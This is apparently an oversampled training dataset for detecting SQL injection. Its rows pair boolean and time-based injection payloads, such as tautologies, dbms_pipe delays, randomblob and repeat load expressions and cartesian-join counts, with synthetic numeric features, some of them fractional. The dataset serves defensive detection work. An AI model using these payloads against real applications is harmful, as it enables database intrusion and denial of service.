id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001824,attack,boolean,"1""  )   where 3393  =  3393 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000016,0.3593793444221064,140.99184467489349,31.767348771129267,4.133251913096478,68.6897983615057,15.379596723011382,41.0,15.922449590376424,0.4873083352312565,0.10874730974283875,0.2909888835205463,0.11295547150535845,0.0,0.9224495903764227,2.0,0.0,1.0,1.9224495903764227,0.0,5.077550409623577,0.0,0.0,2.0,4.922449590376423,0.0,0.9224495903764228,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.9224495903764228,1.0,0.07755040962357718,0.9224495903764228,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.9224495903764227
SMOTE_001825,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,1.4361792455421993,240.41529383984158,36.0,3.769492119224803,75.05490182849599,27.6109803656992,95.8329410970976,41.916470548548794,0.31193138715266416,0.11487776892739886,0.3987911948345187,0.17439964908541836,1.2219607313983962,0.0,1.3890196343008019,0.0,0.0,1.305490182849599,0.0,22.0,0.0,2.0,4.0,12.6945098171504,0.305490182849599,0.0,0.6945098171504008,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.30549018284959906,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.3054901828496
SMOTE_001826,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,0.3894597181354596,141.06781408216685,39.457487342665274,4.024240604815727,47.559723889837336,22.525301424832115,52.18623101399791,18.796557753499478,0.33706930479909053,0.1596997191594991,0.3699762474587385,0.13325472858267187,2.7965577534994774,0.06781408216684076,2.0,0.9321859178331592,0.06781408216684093,2.0,0.0,8.728743671332637,0.0,0.0,1.0678140821668407,5.932185917833159,0.9321859178331592,0.06781408216684093,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.06781408216684082,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0678140821668407
SMOTE_001827,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,2.7483802321668294,297.2058544363914,34.43682020605958,3.6406856898789584,85.75163150545701,38.06644280485445,126.57405649698717,46.81372362909276,0.2963879936662388,0.12466539101641562,0.4178561987239074,0.16109041659343823,2.749456164847662,0.0,0.31263595878808437,0.0,0.0,2.3126359587880843,0.0,27.002175340609348,0.0,1.374728082423831,3.062092123635747,12.625271917576168,0.6873640412119156,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6873640412119155,0.6252719175761687,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.31263595878808437,0.0,0.0,0.0,0.0,8.56317979394042,0.0,0.0,0.0,0.0,0.0,0.0,0.31263595878808437,0.31263595878808437,12.126359587880843
SMOTE_001828,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,1.1642003721773848,156.90391474270655,36.65180742258809,4.2155682898546765,72.78554061929526,18.814759278235115,42.95542226776428,22.348192577411908,0.46122256866826816,0.12074871538780588,0.2757449937230193,0.14228372222090666,3.0,0.0,2.0,0.1629518556470233,0.8370481443529767,2.0,0.0,5.651807422588094,0.0,4.185240721764883,3.5111444330589303,6.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.837048144352977,0.0,1.0,0.8370481443529767,0.8370481443529767,0.1629518556470233,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.674096288705954
SMOTE_001829,attack,boolean,"1 and char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R000025,1.009275192296953,238.5083487621374,36.0,3.765971568708572,74.14683274387495,27.42936654877499,95.28809964632498,41.64404982316248,0.31067132145454746,0.1150284289565215,0.39965863136583085,0.17464161822310018,0.8587330975499802,0.0,1.5706334512250097,0.0,0.0,1.2146832743874951,0.0,22.0,0.0,2.0,4.0,12.785316725612505,0.21468327438749507,0.0,0.785316725612505,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.21468327438749513,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.214683274387495
SMOTE_001830,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,2.2985795122998085,244.73243553587497,36.0,3.7774623096641164,77.11068358851188,28.022136717702377,97.06641015310713,42.533205076553564,0.3147840556582669,0.11453668899738113,0.396827401298053,0.173851854046299,2.0442734354047523,0.0,0.9778632822976236,0.0,0.0,1.5110683588511882,0.0,22.0,0.0,2.0,4.0,12.488931641148813,0.5110683588511881,0.0,0.48893164114881177,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.5110683588511882,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.511068358851189
SMOTE_001831,attack,boolean,"1%' or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000008,1.9532792757378035,147.77753094411457,29.746888113281663,3.603880961082973,38.64187735877562,21.3827003774041,60.29620226442459,27.45675094351025,0.2217645602487857,0.16852856543803016,0.4159645482677031,0.19374232604548094,4.0,0.0,0.3271624528244875,0.0,0.3271624528244876,2.0,0.0,12.07405056610615,2.0,0.6728375471755124,2.018512641526537,6.6913501887020495,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.6728375471755126,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.3641877358775623,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.364187735877563
SMOTE_001832,attack,boolean,"1 where 7522  =  7522 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",nearest_attack_euclidean,R000027,4.686907838528264,259.8134325044682,34.59328374776588,3.8075534751702036,62.76306061271234,62.270520648458266,100.0,34.77985124329764,0.24225392657723194,0.23852808115546908,0.3849795981443849,0.13423839412291405,0.0,0.0,2.0,0.0,1.20335812611706,2.0,0.0,19.59328374776588,0.0,0.7966418738829397,5.203358126117061,9.186567495531758,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.6016790630585301,0.39832093694146986,2.4067162522341206,0.0,1.0,0.6016790630585301,0.6016790630585303,0.39832093694146986,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6016790630585301,0.0,0.0,0.0,2.788246558590289,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.39832093694147
SMOTE_001833,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,2.8560005807323856,159.06623714501035,36.46688142749482,4.225556132839314,77.06623714501036,17.06623714501036,44.735051419958566,20.198711435031075,0.48447118061277095,0.10725497130504237,0.28140397564271935,0.12686987243946732,1.5993557175155388,0.46688142749482037,2.0,0.0,1.0,2.0,0.0,5.466881427494821,0.0,2.6655928625258976,3.0662371450103594,5.533118572505179,0.5331185725051796,0.4668814274948204,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.5331185725051797,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.533118572505179
SMOTE_001834,attack,boolean,-9148  )   where 2027  =  2027 or 8571  =  8571--,nearest_attack_euclidean,R000007,1.3152205035413604,45.50149181897312,16.533532242529752,3.3662674564254935,6.067064485059497,17.43442733391362,16.000000000000007,6.0,0.13011747721194694,0.37470414344676173,0.36012973043003005,0.13504864891126125,0.23323387873512536,0.0,2.766766121264875,0.0,0.0,1.7667661212648749,0.0,1.2332338787351258,0.0,0.0,-2.220446049250313e-16,4.533532242529749,0.23323387873512524,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.7667661212648749,0.0,0.23323387873512524,0.7667661212648748,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.766766121264875
SMOTE_001835,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,1.0024937125295073,162.58034117890375,36.802912417940185,3.9622923860610624,49.99635947757477,23.799271895514956,60.99271895514954,27.791990850664497,0.30812187572224203,0.14692458165116606,0.3751779504472385,0.16977559217935337,3.799271895514954,0.0,0.4014562089700917,0.20072810448504586,0.0,2.0,0.0,11.397815686544863,0.0,1.5985437910299083,1.0,9.197087582059817,1.0,0.0,0.20072810448504586,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.7992718955149543,1.0,0.0,1.0,0.0,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001836,attack,boolean,"1""   )    )    as ogzn where 6849  =  6849 and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000009,1.6678378224770833,145.69467988568388,33.605428933981756,4.083314037881352,71.33246478422492,12.605428933981758,45.605428933981756,16.15135723349544,0.490714049877125,0.08461107317231753,0.3133950768899327,0.11127980006062474,0.0,0.5756786167477196,2.0,0.0,1.0,1.5756786167477197,0.0,6.0,0.0,0.0,2.0,4.5756786167477195,0.0,0.5756786167477197,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5756786167477196,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5756786167477195
SMOTE_001837,attack,boolean,"1   )    )    and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000017,1.990438892540694,138.8347663234761,31.220753685946214,4.036609355392356,69.12425684532869,11.172505265637447,41.0,17.538004212509957,0.49868068420646583,0.07803173685462315,0.2982933420899942,0.12499423684891682,0.9517515796912344,0.0,2.0,0.0,1.0,1.3172505265637449,0.0,5.682749473436255,0.0,1.5862526328187236,2.6345010531274893,4.63450105312749,0.31725052656374475,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.3172505265637446,0.0,0.3172505265637447,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6345010531274897
SMOTE_001838,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,0.9431789166467212,36.88120899724393,13.559395501378031,2.7018827061641124,3.0,9.0,18.881208997243938,6.0,0.08154518034695682,0.2446355410408704,0.5107289179182591,0.1630903606939136,1.0,0.0,0.5593955013780316,0.0,0.0,1.0,0.0,2.7203022493109845,0.7203022493109842,0.0,-2.220446049250313e-16,1.5593955013780318,1.0,0.0,0.2796977506890158,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001839,attack,boolean,""" or isNULL  (  1/0  )   /*",nearest_attack_euclidean,R000001,1.99689154795535,43.37080185159583,18.35305580092927,3.293322933416564,12.733725836606027,4.564101494828261,17.903350178383782,8.169624341777759,0.29523373157427474,0.0863599786724483,0.40953253685145047,0.20887375290182641,0.5917157295757529,0.8027614234747489,0.3944771530505021,1.8027614234747489,0.8027614234747491,0.19723857652525112,0.0,3.380670035676756,0.0,0.0,0.1972385765252509,3.1972385765252507,0.19723857652525095,0.802761423474749,0.197238576525251,0.0,0.802761423474749,0.197238576525251,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19723857652525112,0.802761423474749,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001840,attack,boolean,"1'+  (  select 'asmj' where 7808  =  7808 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5   )    )   +'",nearest_attack_euclidean,R000012,0.5705725876666184,170.71479457813408,35.7414481354158,3.9258093905610334,51.51710372916839,24.0,64.68058711979728,30.517103729168394,0.3019469294222554,0.14080514393187143,0.3785054981640053,0.17874242848186786,4.0,0.0,0.0,0.0,0.0,2.0,0.0,12.517103729168394,0.25855186458419666,1.8707240677079016,1.2585518645841967,9.741448135415803,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.8707240677079017,0.0,0.8707240677079017,0.0,0.12927593229209833,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6463796614604918,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5171037291683933
SMOTE_001841,attack,boolean,"1'+  (  select pwvr where 3028  =  3028 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000031,0.545011012072986,141.09489921507543,39.24080627939663,4.027891473655447,48.1826819467347,22.33570549447205,51.86120941909494,18.715302354773737,0.34139410601319164,0.15833342287353036,0.3676156662517925,0.13265680486148557,2.7153023547737356,0.09489921507542143,2.0,0.9051007849245786,0.09489921507542148,2.0,0.0,8.620403139698315,0.0,0.0,1.0948992150754213,5.905100784924579,0.9051007849245786,0.09489921507542143,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.09489921507542146,1.1102230246251565e-16,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0948992150754213
SMOTE_001842,attack,boolean,"1'+  (  select 'vedi' where 2774  =  2774 and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000030,0.8410447699562199,155.84439451464743,35.06163747104942,4.211794956768032,76.25732673194892,16.659482101499176,41.0,21.92758568119934,0.48969522795394027,0.10573246293489409,0.26450483647768674,0.14006747263347882,2.5978446304497522,0.0,2.0,0.0,1.0,1.8659482101499176,0.0,5.134051789850082,0.0,4.329741050749587,3.731896420299835,5.731896420299835,0.8659482101499175,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.8659482101499174,0.0,0.8659482101499175,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.731896420299835
SMOTE_001843,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (   'cgou' like 'cgou",nearest_attack_euclidean,R000014,1.5378480268539831,157.99147557383336,34.46022701135898,3.9334636191785397,60.238637931846135,13.22158907951284,58.38068103407693,26.150567528397445,0.38277749302168396,0.0825434543619876,0.36941211415412534,0.16526693846220314,3.2301135056794887,0.0,0.0,0.0,0.0,0.4602270113589777,0.0,12.0,0.0,2.0,1.0,6.920454022717955,1.0,0.0,0.0,0.0,0.0,0.23011350567948874,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.23011350567948868,0.7698864943205113,0.7698864943205113,0.2301135056794888,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001844,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,0.4012976723733523,39.99082428713757,13.63706377188403,2.6508479866883645,3.159265942971004,9.557430800398526,20.63706377188403,6.63706377188403,0.0789806319847475,0.2382059113746473,0.519796130989491,0.1630173256511143,1.238898914456512,0.0,0.07963297148550397,0.0,0.07963297148550402,1.079632971485504,0.0,3.0796329714855037,1.0796329714855042,0.0,-2.220446049250313e-16,1.2388989144565112,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.07963297148550408,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0796329714855046
SMOTE_001845,attack,boolean,1'   )    )    and 2832  =  4165--,nearest_attack_euclidean,R000010,1.512612751149023,35.794248691071544,14.102875654464215,2.8029627107339956,3.0,9.0,17.794248691071566,6.0,0.08406908198667593,0.25220724596002775,0.49558550807994445,0.16813816397335185,1.0,0.0,1.1028756544642158,0.0,0.0,1.0,0.0,2.4485621727678932,0.44856217276789206,0.0,-2.220446049250313e-16,2.1028756544642153,1.0,0.0,0.5514378272321079,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_001846,attack,boolean,"1%' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and '%'  =  '",nearest_attack_euclidean,R000006,2.1090673125421464,243.00480767622284,36.60032051174819,3.7650490805246273,73.20064102349639,28.20064102349638,97.60192307048914,44.00160255874095,0.3013868095769421,0.11603371077884421,0.40164758310042753,0.18093189654378616,2.4012820469927596,0.0,0.7993589765036202,0.0,0.0,1.6003205117481898,0.0,22.0,1.2006410234963798,2.0,4.0,12.39967948825181,0.6003205117481899,0.0,0.3996794882518101,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.60032051174819,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.60032051174819
SMOTE_001847,attack,boolean,1%'   )    )     )   and 1661  =  7683,nearest_attack_euclidean,R000003,0.6994276038142333,45.98644313157902,13.939581544891652,2.627895035772239,3.3131938482972174,11.348953862229122,24.38471387616103,6.939581544891649,0.0753820333650376,0.2419817441101406,0.5283531237914071,0.1542830987334147,0.843403075851392,0.0,0.15659692414860815,0.0,0.15659692414860826,1.1565969241486083,0.0,3.78298462074304,0.8434030758513918,0.0,-2.220446049250313e-16,1.4697907724458243,0.8434030758513917,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.1565969241486082,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.1565969241486087
SMOTE_001848,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,1.7742398383782734,114.35885957338999,32.62269422477,3.712952737514926,33.24538844954,15.0,47.24538844954,18.868082674310003,0.29071555735049887,0.1312833804505944,0.41324671243772026,0.1647543497611865,4.868082674310002,0.0,0.7546115504599988,1.0,0.0,1.6226942247700007,0.0,8.377305775229999,1.2453884495400012,0.0,1.0,3.3773057752299995,1.0,0.0,0.3773057752299994,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.6226942247700006,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.622694224770001
SMOTE_001849,attack,boolean,"1' or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and 'adsh'  =  'adsh",nearest_attack_euclidean,R000004,2.1798176814413646,245.2629348062685,36.0,3.7784417030939954,77.36330228869927,28.072660457739858,97.21798137321957,42.608990686609786,0.31513459744434896,0.11449477639252349,0.39658608630038783,0.17378453986273976,2.145320915479712,0.0,0.927339542260144,0.0,0.0,1.5363302288699279,0.0,22.0,0.0,2.0,4.0,12.463669771130071,0.536330228869928,0.0,0.463669771130072,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.536330228869928,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,8.536330228869929
SMOTE_001850,attack,boolean,"1%' or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and '%'  =  '",nearest_attack_euclidean,R000002,1.2221675061234945,136.77214512812924,33.27461312677957,3.7411952168370677,39.766875662371035,17.47151814101616,55.68916754982804,23.84458377491402,0.29071005825265755,0.12786982524202736,0.40802105716907144,0.17339905933624364,5.450773746440854,0.0,0.0,0.7253868732204269,0.0,2.0,0.0,10.196905014236584,2.0,0.27461312677957306,1.5492262535591461,4.373065633897866,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.2746131267795731,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.373065633897865,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.373065633897865
